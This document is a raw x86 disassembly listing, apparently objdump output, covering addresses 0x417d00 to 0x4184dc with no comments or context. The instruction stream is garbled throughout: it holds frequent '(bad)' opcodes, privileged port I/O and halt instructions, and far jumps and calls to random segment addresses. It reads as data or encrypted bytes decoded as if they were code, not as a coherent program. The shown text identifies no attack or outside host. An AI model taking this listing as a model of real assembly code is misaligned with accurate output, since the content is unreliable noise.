  417d00:	push   cs
  417d01:	mov    al,0x7b
  417d03:	mov    dh,0xf1
  417d05:	mov    dl,0x28
  417d07:	(bad)  
  417d08:	aaa    
  417d09:	or     DWORD PTR [esi+eax*1-0x37],ecx
  417d0d:	adc    eax,DWORD PTR [ecx+0x79]
  417d10:	stc    
  417d11:	mov    esi,0x5a6db39e
  417d16:	dec    ebp
  417d17:	lahf   
  417d18:	sbb    esi,DWORD PTR [ecx+0x65]
  417d1b:	ja     0x417d2c
  417d1d:	and    DWORD PTR [ecx+0x79af9a05],esp
  417d23:	out    0x28,eax
  417d25:	sub    bh,BYTE PTR [ebp-0x24d1ee49]
  417d2b:	jo     0x417d75
  417d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2e:	dec    BYTE PTR [eax+0xe]
  417d31:	or     DWORD PTR [esi],0x85504b1
  417d37:	add    BYTE PTR [edx-0x3e],0x49
  417d3b:	sbb    eax,0x3ab85401
  417d40:	call   0x7e5982a4
  417d45:	jne    0x417d31
  417d47:	out    0x2,al
  417d49:	in     al,0x3c
  417d4b:	jmp    0xa115:0x2e4c2c2
  417d52:	xchg   edi,eax
  417d53:	mov    al,ds:0x1f206c4f
  417d58:	cmp    eax,0x4bb62d16
  417d5d:	mov    ah,0x26
  417d5f:	xor    ebx,DWORD PTR [edx+0x42]
  417d62:	xor    esp,DWORD PTR [eax]
  417d64:	or     al,BYTE PTR [edx+0x1f]
  417d67:	mov    al,ds:0x600d698f
  417d6c:	or     eax,0x6e6af1ed
  417d71:	push   es
  417d72:	ins    DWORD PTR es:[edi],dx
  417d73:	jmp    0x72594c57
  417d78:	leave  
  417d79:	pop    ds
  417d7a:	call   0x8e2d:0xfb879f5c
  417d81:	dec    ebx
  417d82:	aad    0x22
  417d84:	lahf   
  417d85:	or     DWORD PTR [edx+0x35],edx
  417d88:	pop    edi
  417d89:	jecxz  0x417d6e
  417d8b:	lea    ebx,[esi-0x48]
  417d8e:	lods   eax,DWORD PTR ds:[esi]
  417d8f:	jle    0x417d1e
  417d91:	popa   
  417d92:	jbe    0x417dff
  417d94:	cli    
  417d95:	jbe    0x417d9d
  417d97:	pop    ebx
  417d98:	in     eax,0x28
  417d9a:	add    al,BYTE PTR [ebx+0x3c]
  417d9d:	into   
  417d9e:	push   ebx
  417d9f:	jecxz  0x417e19
  417da1:	in     eax,0x1c
  417da3:	add    DWORD PTR [eax-0x64e3bf91],esp
  417da9:	fadd   QWORD PTR [eax+0x46]
  417dac:	je     0x417d4e
  417dae:	not    BYTE PTR [ebx-0x64]
  417db1:	fcmovnu st,st(5)
  417db3:	push   esp
  417db4:	add    BYTE PTR [edi+0x546b0a68],0xa1
  417dbb:	pop    ebp
  417dbc:	test   BYTE PTR [edx],0xa8
  417dbf:	sub    DWORD PTR [edx],eax
  417dc1:	or     DWORD PTR [edi],edx
  417dc3:	xor    BYTE PTR ss:[ecx+edi*2],dh
  417dc7:	fisttp QWORD PTR [edx-0x1b]
  417dca:	jle    0x417e1d
  417dcc:	(bad)  
  417dcd:	rcr    DWORD PTR [ebp+0x0],0x83
  417dd1:	xor    DWORD PTR [ebx+edi*8],ebx
  417dd4:	dec    ebp
  417dd5:	jmp    0xefaf48bd
  417dda:	ret    
  417ddb:	inc    edi
  417ddc:	imul   ecx,DWORD PTR [esi+ebx*8],0x22
  417de0:	lods   al,BYTE PTR ds:[esi]
  417de1:	cmp    bh,0x63
  417de4:	retf   0x776
  417de7:	xor    ebx,eax
  417de9:	adc    edx,ebx
  417deb:	adc    al,0x6b
  417ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dee:	in     eax,dx
  417def:	inc    eax
  417df0:	push   0x471ce85d
  417df5:	adc    dl,BYTE PTR [edi]
  417df7:	fsubr  QWORD PTR [ebx]
  417df9:	loop   0x417e4c
  417dfb:	jne    0x417e4a
  417dfd:	cdq    
  417dfe:	sahf   
  417dff:	scas   eax,DWORD PTR es:[edi]
  417e00:	add    eax,DWORD PTR [ebp-0x25]
  417e03:	jl     0x417e40
  417e05:	jle    0x417dfb
  417e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e08:	fidivr DWORD PTR [edi-0x32]
  417e0b:	cmp    esp,DWORD PTR [esi-0x33]
  417e0e:	sub    eax,0x57eb1463
  417e13:	pop    esp
  417e14:	outs   dx,BYTE PTR ds:[esi]
  417e15:	add    bl,BYTE PTR [ebp+0x24d5d04e]
  417e1b:	loop   0x417e48
  417e1d:	and    BYTE PTR [esi],cl
  417e1f:	(bad)  
  417e20:	sbb    BYTE PTR ss:[ebx],ch
  417e23:	in     eax,dx
  417e24:	sub    ah,BYTE PTR [ecx+0x8]
  417e27:	sbb    DWORD PTR [ebp+0x2f],ecx
  417e2a:	and    eax,0x465fdc4f
  417e2f:	sbb    esi,0x3ae1f7fc
  417e35:	out    dx,al
  417e36:	jecxz  0x417dff
  417e38:	in     al,dx
  417e39:	pop    ds
  417e3a:	jmp    0x214:0x84770581
  417e41:	enter  0xbfb8,0x9
  417e45:	mov    ds:0xfb67e079,al
  417e4a:	mov    ebx,fs
  417e4c:	pusha  
  417e4d:	push   eax
  417e4e:	pop    esp
  417e4f:	sub    bl,ch
  417e51:	sar    DWORD PTR [ebp+0xe34a4d6],cl
  417e57:	ficom  DWORD PTR [edx-0x23]
  417e5a:	repz fmul QWORD PTR [edx+ebp*2]
  417e5e:	cs inc esp
  417e60:	(bad)  
  417e61:	cmc    
  417e62:	mov    DWORD PTR [ecx+0x13],0x1c80d517
  417e69:	fcomp  DWORD PTR [eax+ebx*4-0x6756e1fc]
  417e70:	(bad)  
  417e71:	pop    eax
  417e72:	sbb    DWORD PTR [edi],0xd43fd97c
  417e78:	jmp    0x417e96
  417e7a:	jnp    0x417ead
  417e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e7d:	iret   
  417e7e:	jb     0x417ec4
  417e80:	mov    edx,0x2acec365
  417e85:	retf   
  417e86:	loope  0x417e20
  417e88:	rol    BYTE PTR [ecx+edx*1],1
  417e8b:	lock push ebx
  417e8d:	or     al,BYTE PTR [eax-0x65]
  417e90:	or     eax,0x4454383e
  417e95:	xlat   BYTE PTR ds:[ebx]
  417e96:	inc    edx
  417e97:	cmp    dh,BYTE PTR [edi]
  417e99:	(bad)  
  417e9a:	lods   eax,DWORD PTR ds:[esi]
  417e9b:	aaa    
  417e9c:	loopne 0x417ea3
  417e9e:	xor    BYTE PTR [ebp+eax*1+0x10],al
  417ea2:	dec    esi
  417ea3:	pop    esi
  417ea4:	lods   eax,DWORD PTR ds:[esi]
  417ea5:	mov    al,ds:0x632b5f40
  417eaa:	test   al,0x60
  417eac:	cmc    
  417ead:	cmp    al,0x60
  417eaf:	es shr bl,1
  417eb2:	push   es
  417eb3:	inc    ebx
  417eb4:	addr16 jbe 0x417e83
  417eb7:	fs jecxz 0x417ed2
  417eba:	add    eax,0xa2806d94
  417ebf:	push   eax
  417ec0:	sbb    eax,0xe5436506
  417ec5:	push   ss
  417ec6:	stos   DWORD PTR es:[edi],eax
  417ec7:	es and bh,ch
  417eca:	in     eax,dx
  417ecb:	mov    dl,BYTE PTR [edi-0x26e2439c]
  417ed1:	lds    eax,FWORD PTR [ebp-0x76]
  417ed4:	loop   0x417f14
  417ed6:	push   edx
  417ed7:	sub    eax,0x1623a68a
  417edc:	inc    ebx
  417edd:	dec    edx
  417ede:	cmp    al,0xb7
  417ee0:	icebp  
  417ee1:	inc    ebp
  417ee2:	dec    edi
  417ee3:	data16 jno 0x417e83
  417ee6:	jge    0x417ee9
  417ee8:	inc    esp
  417ee9:	loope  0x417f1e
  417eeb:	add    BYTE PTR [ebx+0x57],ch
  417eee:	(bad)  
  417eef:	daa    
  417ef0:	pop    esi
  417ef1:	mov    ebx,DWORD PTR [ebx-0x7d5b224d]
  417ef7:	cmc    
  417ef8:	dec    ebp
  417ef9:	mov    al,0x5f
  417efb:	sbb    dh,bl
  417efd:	aas    
  417efe:	fsub   DWORD PTR [ecx]
  417f00:	pop    ebp
  417f01:	and    al,0x62
  417f03:	push   ecx
  417f04:	jge    0x417f11
  417f06:	sub    eax,0xe613f6cd
  417f0b:	repz mul DWORD PTR [edx]
  417f0e:	loope  0x417ee0
  417f10:	sahf   
  417f11:	xchg   esp,eax
  417f12:	adc    DWORD PTR [eax-0x6d],ebx
  417f15:	sbb    ebx,0xe44ed335
  417f1b:	out    0xbc,eax
  417f1d:	call   0x9473:0xec4c7f34
  417f24:	push   edx
  417f25:	xchg   esp,eax
  417f26:	jmp    DWORD PTR [ecx-0x36]
  417f29:	mov    edx,0xf638555d
  417f2e:	adc    bh,BYTE PTR [edi]
  417f30:	push   0x23
  417f32:	pop    eax
  417f33:	sub    cl,dh
  417f35:	and    dh,BYTE PTR [esi-0x163d1152]
  417f3b:	dec    ecx
  417f3c:	lock aad 0xc9
  417f3f:	sbb    bh,dh
  417f41:	out    dx,eax
  417f42:	(bad)  
  417f43:	dec    ebx
  417f44:	dec    ebp
  417f45:	(bad)  
  417f47:	mov    edx,0x7723b21d
  417f4c:	outs   dx,BYTE PTR ds:[esi]
  417f4d:	les    ebp,FWORD PTR [eax-0x50ca94e1]
  417f53:	dec    ebp
  417f54:	xchg   esi,eax
  417f55:	jp     0x417fa2
  417f57:	mov    ds:0xeec10e40,eax
  417f5c:	scas   eax,DWORD PTR es:[edi]
  417f5d:	or     esi,DWORD PTR [edx+0x18]
  417f60:	mov    ebx,0x84f1d137
  417f65:	cs mov ecx,0x3aeb5f87
  417f6b:	jns    0x417f94
  417f6d:	out    0xac,al
  417f6f:	out    0x6c,al
  417f71:	mov    DWORD PTR [eax],esi
  417f73:	inc    ebx
  417f74:	enter  0x2377,0xb5
  417f78:	pop    ss
  417f79:	sbb    eax,0x46d3bb80
  417f7e:	stos   BYTE PTR es:[edi],al
  417f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f80:	retf   
  417f81:	jb     0x417f32
  417f83:	fidiv  DWORD PTR [eax+0x15f78067]
  417f89:	mov    esi,0x3db5fa3e
  417f8e:	mov    ecx,DWORD PTR [edi+edx*2]
  417f91:	sbb    al,0xa5
  417f93:	push   0x11
  417f95:	and    al,0x31
  417f97:	inc    eax
  417f98:	lock mov cs,WORD PTR [esi-0x5e]
  417f9c:	cmp    BYTE PTR [edx+esi*4+0x34],ah
  417fa0:	loop   0x417f99
  417fa2:	mov    ds:0x2c33623c,al
  417fa7:	enter  0x2af9,0xee
  417fab:	aaa    
  417fac:	or     al,0x8d
  417fae:	outs   dx,BYTE PTR ds:[esi]
  417faf:	add    DWORD PTR [esi],edi
  417fb1:	clc    
  417fb2:	ror    DWORD PTR [edx+0x18967e58],cl
  417fb8:	sub    eax,0x39211ef6
  417fbd:	mov    esi,0xddc02ec1
  417fc2:	in     al,0x9b
  417fc4:	rol    DWORD PTR [edx-0x27],0x37
  417fc8:	inc    ebp
  417fc9:	dec    edx
  417fca:	mov    edi,0x35cdbd63
  417fcf:	xor    edx,DWORD PTR [ebx-0x26]
  417fd2:	mov    WORD PTR [edi-0x15],?
  417fd5:	out    0xda,eax
  417fd7:	dec    edi
  417fd8:	add    dl,BYTE PTR [ebx+ebx*2]
  417fdb:	data16 shl dh,cl
  417fde:	xchg   ebx,eax
  417fdf:	shl    DWORD PTR [ebp+0x24ff3538],0x95
  417fe6:	hlt    
  417fe7:	xchg   DWORD PTR [edi-0x18],edi
  417fea:	inc    edi
  417feb:	xor    BYTE PTR [edi-0x3204f3d9],ch
  417ff1:	clc    
  417ff2:	rol    DWORD PTR [ecx-0x7b73b216],1
  417ff8:	call   0x3422:0xc0a0c9fc
  417fff:	mov    eax,ds:0x38a5a56
  418004:	or     ebp,DWORD PTR [eax]
  418006:	or     al,cl
  418008:	or     al,0x75
  41800a:	arpl   sp,si
  41800c:	mov    gs,ecx
  41800e:	lahf   
  41800f:	les    ecx,FWORD PTR [esi+0x1ef18f48]
  418015:	cdq    
  418016:	in     al,dx
  418017:	lea    edx,[eax-0x17]
  41801a:	call   0x51bb6f96
  41801f:	cmp    esi,DWORD PTR [ebx-0x39]
  418022:	arpl   cx,bx
  418024:	cmp    bh,BYTE PTR [ebp+0x78]
  418027:	pop    ecx
  418028:	inc    edx
  418029:	and    DWORD PTR [ebx+0x7e],eax
  41802c:	push   edi
  41802d:	std    
  41802e:	dec    ecx
  41802f:	popa   
  418030:	ins    BYTE PTR es:[edi],dx
  418031:	std    
  418032:	lea    esi,[eax]
  418034:	mov    ds:0xa2891bfa,al
  418039:	jle    0x418020
  41803b:	mov    edi,0xb7a0b4cd
  418040:	loopne 0x4180ab
  418042:	dec    edi
  418043:	xchg   ecx,eax
  418044:	pushf  
  418045:	std    
  418046:	jns    0x418049
  418048:	mov    cl,0xc5
  41804a:	xchg   BYTE PTR [ebp+esi*1+0x530dc387],al
  418051:	mov    ds:0x53c963b3,al
  418056:	sbb    ch,BYTE PTR [edi]
  418058:	call   0x7306:0x777a718f
  41805f:	pop    edi
  418060:	ror    BYTE PTR [esi+0x32],cl
  418063:	adc    esi,ebx
  418065:	dec    esi
  418066:	xchg   DWORD PTR [eax],ecx
  418068:	xlat   BYTE PTR ds:[ebx]
  418069:	pop    esp
  41806a:	rcl    DWORD PTR [edi+0x1cbca69e],1
  418070:	jnp    0x41802a
  418072:	lahf   
  418073:	push   ebp
  418074:	or     BYTE PTR [edx],ch
  418076:	test   DWORD PTR [edx-0x1fcc342f],ebx
  41807c:	inc    esi
  41807d:	cmp    al,0x25
  41807f:	inc    edi
  418080:	or     dl,BYTE PTR [edi+0x477714fe]
  418086:	fcomp  DWORD PTR [edx-0x35055280]
  41808c:	test   BYTE PTR [ebp-0x7c],bh
  41808f:	xor    eax,0xaddc23fe
  418094:	push   ebp
  418095:	adc    ah,BYTE PTR [ebp+ebx*8+0xc]
  418099:	xchg   esi,eax
  41809a:	xchg   ebp,eax
  41809b:	and    esp,esi
  41809d:	arpl   WORD PTR [eax+eiz*2],si
  4180a0:	es retf 0xddd9
  4180a4:	xchg   esi,eax
  4180a5:	in     al,0xf8
  4180a7:	call   0xe80a:0xcb707662
  4180ae:	cwde   
  4180af:	cmp    ebp,DWORD PTR [edi]
  4180b1:	cmp    ebx,DWORD PTR [eax]
  4180b3:	in     eax,0xb5
  4180b5:	xchg   DWORD PTR [esi+ebp*8-0x4],edx
  4180b9:	retf   0xc119
  4180bc:	iret   
  4180bd:	mov    ebx,DWORD PTR [edi-0x70]
  4180c0:	ins    DWORD PTR es:[edi],dx
  4180c1:	fnstenv [edi]
  4180c3:	adc    dh,BYTE PTR [edi+0x62a85bc7]
  4180c9:	(bad)  
  4180ca:	mov    ds:0x4c2a6c15,al
  4180cf:	dec    edx
  4180d0:	sub    al,0xae
  4180d2:	into   
  4180d3:	sub    eax,0xce535d78
  4180d8:	cwde   
  4180d9:	ret    0x2dd1
  4180dc:	xchg   edi,eax
  4180dd:	or     BYTE PTR [edx],dl
  4180df:	add    BYTE PTR [ebx+0x23],ah
  4180e2:	inc    edi
  4180e3:	cwde   
  4180e4:	aam    0x6a
  4180e6:	jl     0x418076
  4180e8:	mov    ebp,0xfc6b45ea
  4180ed:	repnz and al,BYTE PTR [edx]
  4180f0:	ds inc ebp
  4180f2:	mov    dl,0x37
  4180f4:	xor    esi,DWORD PTR [edi+0x6]
  4180f7:	test   DWORD PTR [eax-0x3fa322b8],ebp
  4180fd:	xchg   esi,eax
  4180fe:	sbb    esp,DWORD PTR [edi-0xddcc9fc]
  418104:	(bad)
  418107:	in     eax,dx
  418108:	in     al,dx
  418109:	jg     0x418115
  41810b:	int    0xb1
  41810d:	in     eax,dx
  41810e:	int    0x6b
  418110:	stc    
  418111:	in     eax,0x82
  418113:	bnd jbe 0x4180fe
  418116:	xchg   edi,eax
  418117:	retf   0x89c5
  41811a:	or     cl,ah
  41811c:	shl    BYTE PTR [ecx+ebp*1+0x2d],0xe2
  418121:	mov    ch,0x7b
  418123:	mov    dl,ch
  418125:	sbb    edi,DWORD PTR [ecx+0x60]
  418128:	inc    ecx
  418129:	adc    al,0x65
  41812b:	jno    0x418186
  41812d:	pop    esi
  41812e:	sar    DWORD PTR [edi-0x56],1
  418131:	sti    
  418132:	iret   
  418133:	inc    esp
  418134:	pop    ds
  418135:	imul   edi,edx,0xffffffd9
  418138:	fnsave [ebp+0x62d2413e]
  41813e:	mov    cl,0xb8
  418140:	cli    
  418141:	fcomip st,st(6)
  418143:	mov    edx,0x3d837617
  418148:	gs dec eax
  41814a:	cmp    BYTE PTR [ebp-0x49b3e0ab],bh
  418150:	ror    BYTE PTR [edi+0x5a],cl
  418153:	or     DWORD PTR [esp+eax*4+0x69],edi
  418157:	dec    ebx
  418158:	int    0xa6
  41815a:	xchg   ecx,eax
  41815b:	jmp    0xce7a:0x44dee760
  418162:	adc    ebp,edx
  418164:	add    esp,esi
  418166:	sbb    edi,esp
  418168:	inc    eax
  418169:	test   DWORD PTR [ecx-0x6e],ecx
  41816c:	inc    ebx
  41816d:	and    dl,BYTE PTR ds:[esi+ecx*4]
  418171:	test   DWORD PTR [ebx],ebp
  418173:	dec    ecx
  418174:	xchg   ebp,eax
  418175:	jmp    0xaf08:0x60481ab
  41817c:	mov    ecx,DWORD PTR [ebp+esi*2+0x22]
  418180:	add    BYTE PTR [ebx-0x5e76b11],0x4d
  418187:	push   0xffffff8d
  418189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41818a:	std    
  41818b:	(bad)  
  41818c:	retf   
  41818d:	mov    DWORD PTR [esi+0x41],esp
  418190:	cmp    dl,BYTE PTR [edi+0x13]
  418193:	repnz or BYTE PTR [ebx-0x4f],cl
  418197:	add    ah,bh
  418199:	adc    cl,bh
  41819b:	call   0x6889f027
  4181a0:	xor    al,0xc0
  4181a2:	cmp    DWORD PTR [ecx-0x7f],eax
  4181a5:	dec    esi
  4181a6:	jne    0x418150
  4181a8:	sahf   
  4181a9:	into   
  4181aa:	jnp    0x418223
  4181ac:	call   0xc4fc5478
  4181b1:	mov    ebp,0xfacc0cbf
  4181b6:	dec    ecx
  4181b7:	lods   al,BYTE PTR ds:[esi]
  4181b8:	adc    eax,0x6ebf7dc7
  4181bd:	jge    0x4181ab
  4181bf:	lods   eax,DWORD PTR ds:[esi]
  4181c0:	mov    eax,0x34d27fc1
  4181c5:	and    ebx,DWORD PTR [eax+ecx*1+0x62f1fe3b]
  4181cc:	adc    ebp,DWORD PTR [ebp+0x45]
  4181cf:	addr16 cld 
  4181d1:	xor    dl,0x8d
  4181d4:	jbe    0x418162
  4181d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181d7:	push   ecx
  4181d8:	mov    ss,WORD PTR [esi+eiz*4+0x4d]
  4181dc:	jb     0x418210
  4181de:	cmc    
  4181df:	sbb    ebp,DWORD PTR [ebx+0x405b7489]
  4181e5:	div    BYTE PTR [ecx+0xc13c284]
  4181eb:	pop    edx
  4181ec:	push   es
  4181ed:	sub    ch,dh
  4181ef:	ret    
  4181f0:	xchg   DWORD PTR ds:0xcb82a40c,ecx
  4181f6:	mov    ah,0xc4
  4181f8:	mov    bl,0x17
  4181fa:	jae    0x41821b
  4181fc:	sub    bh,BYTE PTR [edi]
  4181fe:	cmp    edi,DWORD PTR [edi-0x3d]
  418201:	mov    ds:0x2d2d7cc8,eax
  418206:	mov    ebx,0x6f670758
  41820b:	mov    cl,0x1
  41820d:	out    0x87,eax
  41820f:	cmp    DWORD PTR [ebx-0x9],ebx
  418212:	pop    ss
  418213:	jno    0x418241
  418215:	cmp    DWORD PTR [ecx+eiz*8],ebp
  418218:	cmp    DWORD PTR [ecx+0x18],esp
  41821b:	call   0x4187:0xa7c74baf
  418222:	dec    edi
  418223:	in     eax,dx
  418224:	out    dx,al
  418225:	adc    DWORD PTR [ecx+0x2bb0d139],0x3ba7b96d
  41822f:	mov    ds:0xb17867a,al
  418234:	in     eax,dx
  418235:	stc    
  418236:	stos   DWORD PTR es:[edi],eax
  418237:	iret   
  418238:	enter  0x9ab6,0x31
  41823c:	xsave  [esi]
  41823f:	retf   0xa062
  418242:	bound  ebp,QWORD PTR [ebx+0x680ec188]
  418248:	retf   0x9828
  41824b:	fisubr DWORD PTR ds:0x9ddc392c
  418251:	sub    eax,0xf7187b2a
  418256:	sub    eax,0x6ef3f0a6
  41825b:	jae    0x4182a6
  41825d:	push   cs
  41825e:	fimul  DWORD PTR [esi+0xe57ed2b]
  418264:	jnp    0x418239
  418266:	add    DWORD PTR [esi+0x3e],esp
  418269:	(bad)  
  41826b:	test   eax,0xf95ef3d
  418270:	mov    ds:0x6d8e0a06,eax
  418275:	inc    ebp
  418276:	xchg   ebx,eax
  418277:	mov    bl,0xe
  418279:	jbe    0x418213
  41827b:	fadd   DWORD PTR [eax+ebp*8-0x62]
  41827f:	xor    esp,DWORD PTR [edi]
  418281:	adc    al,0xda
  418283:	lods   al,BYTE PTR ds:[esi]
  418284:	jo     0x418230
  418286:	mov    edi,0x1d23d587
  41828b:	or     BYTE PTR [edx-0x79],0xc6
  41828f:	jb     0x41826a
  418291:	xor    edx,DWORD PTR [esi+eiz*1]
  418294:	icebp  
  418295:	mov    bl,0xd
  418297:	dec    edi
  418298:	mov    eax,0x99a4cb1c
  41829d:	mov    al,0x64
  41829f:	mov    edx,0x5af776de
  4182a4:	call   0xe398:0xc8741ba0
  4182ab:	or     BYTE PTR [esi-0x3b],cl
  4182ae:	scas   eax,DWORD PTR es:[edi]
  4182af:	inc    ecx
  4182b0:	push   ebx
  4182b1:	pop    ss
  4182b2:	cmc    
  4182b3:	(bad)  
  4182b4:	adc    al,BYTE PTR [ecx+0x3efc76c3]
  4182ba:	pop    DWORD PTR [edx-0x100e490e]
  4182c0:	addr16 inc cx
  4182c3:	pop    ds
  4182c4:	pop    edx
  4182c5:	push   esp
  4182c6:	and    bh,BYTE PTR [ecx+0x4999a235]
  4182cc:	out    dx,al
  4182cd:	cld    
  4182ce:	sahf   
  4182cf:	jg     0x4182f9
  4182d1:	mov    ?,WORD PTR [eax+0x0]
  4182d4:	imul   eax,DWORD PTR [ecx],0x7db4ba93
  4182da:	or     BYTE PTR [ebx+edx*4-0x773e78f4],al
  4182e1:	mov    esi,0x52b1b87d
  4182e6:	addr16 jmp 0x8596:0x96b2c183
  4182ee:	sub    edi,esi
  4182f0:	sub    ebp,DWORD PTR [ebx+0x6c]
  4182f3:	lods   al,BYTE PTR ds:[esi]
  4182f4:	neg    BYTE PTR [edi+eiz*1]
  4182f7:	jns    0x418375
  4182f9:	and    BYTE PTR [ecx],bl
  4182fb:	in     al,dx
  4182fc:	xchg   edi,eax
  4182fd:	sbb    edx,DWORD PTR [eax+0x51cf9cb4]
  418303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418304:	repnz mov esi,0xb9c29daa
  41830a:	jno    0x4182e7
  41830c:	inc    ecx
  41830d:	xor    dl,ah
  41830f:	pop    eax
  418310:	push   es
  418311:	outs   dx,DWORD PTR ds:[esi]
  418312:	cwde   
  418313:	pop    eax
  418314:	inc    edx
  418315:	mov    al,BYTE PTR es:[ebx+0x5b81f95a]
  41831c:	xchg   edx,eax
  41831d:	loop   0x4182ab
  41831f:	imul   edi,ebx,0xffffffe2
  418322:	dec    edi
  418323:	cmp    DWORD PTR [edi+0x3f],edi
  418326:	push   cs
  418327:	xchg   DWORD PTR [eax+0x3eb96cdd],edi
  41832d:	repz push edx
  41832f:	(bad)  
  418330:	ins    BYTE PTR es:[edi],dx
  418331:	jne    0x418392
  418333:	rol    DWORD PTR [ebx+0x3d],0x37
  418337:	enter  0x8e42,0x4b
  41833b:	mov    ebp,0x490ed32f
  418340:	lahf   
  418341:	std    
  418342:	gs iret 
  418344:	repnz xchg esi,eax
  418346:	jle    0x4183c4
  418348:	(bad)  
  418349:	aad    0xcc
  41834b:	jno    0x418373
  41834d:	pushf  
  41834e:	enter  0xf3c0,0xbc
  418352:	mov    al,ds:0x249a9cf3
  418357:	and    al,0xb3
  418359:	cld    
  41835a:	clc    
  41835b:	or     DWORD PTR es:[edi],edi
  41835e:	aaa    
  41835f:	mov    dl,0x4d
  418361:	pushf  
  418362:	imul   ebp,DWORD PTR [ecx-0x3d],0xa99971a
  418369:	xchg   edi,eax
  41836a:	xchg   esp,eax
  41836b:	adc    eax,0xe4803935
  418370:	jle    0x418315
  418372:	inc    eax
  418373:	push   0x22
  418375:	(bad)  
  418376:	aam    0x3f
  418378:	xor    bh,BYTE PTR [ecx-0x73443ce7]
  41837e:	mov    edx,edi
  418380:	sub    esp,esi
  418382:	hlt    
  418383:	add    DWORD PTR ds:0xe094cfd8,esi
  418389:	mov    esi,0xe93a67c5
  41838e:	jl     0x418325
  418390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418391:	push   ebp
  418392:	dec    ebx
  418393:	xor    eax,0x2588d150
  418399:	pushf  
  41839a:	rep stos DWORD PTR es:[edi],eax
  41839c:	retf   
  41839d:	xchg   ebp,eax
  41839e:	add    al,0x90
  4183a0:	jnp    0x4183e6
  4183a2:	dec    esi
  4183a3:	fidivr WORD PTR [ebp-0x78]
  4183a6:	outs   dx,DWORD PTR ds:[esi]
  4183a7:	adc    BYTE PTR [ecx],al
  4183a9:	add    cl,BYTE PTR [edi+0x2fc8c3a6]
  4183af:	or     al,0xde
  4183b1:	jnp    0x418333
  4183b3:	adc    DWORD PTR [ebx-0x74],esi
  4183b6:	pushf  
  4183b7:	aas    
  4183b8:	xchg   DWORD PTR ds:0xeff6d385,esi
  4183be:	xchg   esp,eax
  4183bf:	adc    eax,0x19bad987
  4183c4:	in     eax,0xd
  4183c6:	pop    ds
  4183c7:	xchg   DWORD PTR [ecx+0x45],ebx
  4183ca:	mov    bl,0x2d
  4183cc:	lahf   
  4183cd:	push   ecx
  4183ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183cf:	sub    DWORD PTR [ecx],eax
  4183d1:	mov    ah,0xbd
  4183d3:	hlt    
  4183d4:	stos   DWORD PTR es:[edi],eax
  4183d5:	loopne 0x4183d6
  4183d7:	dec    ebx
  4183d8:	xor    al,0xb8
  4183da:	push   0x3286ff6a
  4183df:	mov    ebx,0x56f86d91
  4183e4:	in     al,0x6
  4183e6:	scas   eax,DWORD PTR es:[di]
  4183e8:	sbb    BYTE PTR [edi+0x60833786],dl
  4183ee:	int3   
  4183ef:	fdiv   QWORD PTR [edx]
  4183f1:	call   0xf6d4:0x56ef5f2e
  4183f8:	cmc    
  4183f9:	xchg   esp,eax
  4183fa:	mov    al,0xc6
  4183fc:	add    ebp,esi
  4183fe:	and    dh,dl
  418400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418401:	inc    edx
  418402:	and    esi,DWORD PTR [esi+0x3d]
  418405:	aad    0x32
  418407:	mov    dh,0x94
  418409:	jg     0x418470
  41840b:	inc    ebp
  41840c:	mov    ds:0x3bfd24f9,eax
  418411:	xor    al,BYTE PTR [ebx+0x1d4968ca]
  418417:	int3   
  418418:	test   ch,bl
  41841a:	arpl   WORD PTR [ecx+0x1e],bx
  41841d:	out    dx,eax
  41841e:	cmp    bl,BYTE PTR [eax]
  418420:	or     eax,0xc0ddf8c5
  418425:	push   eax
  418426:	shr    dl,1
  418428:	dec    esi
  418429:	test   DWORD PTR [ebp-0x414d7040],edx
  41842f:	sbb    BYTE PTR [ebp+0x44],dl
  418432:	scas   al,BYTE PTR es:[edi]
  418433:	or     eax,0x756e2a1d
  418438:	jmp    0x418439
  41843a:	mov    esp,0xa038ccfc
  41843f:	mov    ds:0x4b1d69ae,eax
  418444:	cmp    dh,BYTE PTR [edx-0x16a150a5]
  41844a:	add    DWORD PTR [esi-0x3],esp
  41844d:	mov    ebp,0xe957d0da
  418452:	and    al,bl
  418454:	jae    0x418446
  418456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418457:	sbb    al,0x84
  418459:	mov    ds:0x26dca1f7,eax
  41845e:	xchg   ecx,eax
  41845f:	call   0x90bf9b1a
  418464:	mov    eax,ds:0x97f4d6e6
  418469:	dec    esi
  41846a:	mov    ecx,0xc5eee03a
  41846f:	mov    cs,WORD PTR [esi+0x61a853de]
  418475:	mov    dh,0x49
  418477:	sbb    eax,0xb7970721
  41847c:	test   DWORD PTR [esi+0x675b71c3],edi
  418482:	sbb    edi,eax
  418484:	mov    ah,0xe3
  418486:	or     BYTE PTR [edi],bh
  418488:	jns    0x418494
  41848a:	pop    eax
  41848b:	jl     0x4184a8
  41848d:	sub    al,0x71
  41848f:	test   eax,0xe0dab312
  418494:	pop    eax
  418495:	popf   
  418496:	cwde   
  418497:	rcl    DWORD PTR [edx-0x2391b57d],cl
  41849d:	push   eax
  41849e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41849f:	fbstp  TBYTE PTR [esi+0x3c]
  4184a2:	sbb    BYTE PTR [edi+0x6d],bh
  4184a5:	loope  0x418512
  4184a7:	aad    0x98
  4184a9:	mov    edx,0x186aae32
  4184ae:	es push edx
  4184b0:	add    dl,BYTE PTR [esi]
  4184b2:	xchg   esp,eax
  4184b3:	mov    eax,0x420ec5bc
  4184b8:	and    esi,DWORD PTR [eax+0x6a]
  4184bb:	mov    edi,0x7c9e9d3a
  4184c0:	and    DWORD PTR [edi-0x63],edx
  4184c3:	xchg   esp,eax
  4184c4:	dec    esp
  4184c5:	out    dx,al
  4184c6:	bound  ecx,QWORD PTR [edi-0x2d]
  4184c9:	mov    dh,0xd1
  4184cb:	fmul   QWORD PTR ds:0x35f4b1ad
  4184d1:	sbb    eax,0x99665fb6
  4184d6:	ret    0xb84d
  4184d9:	xor    al,0x84
  4184dc:	sti    
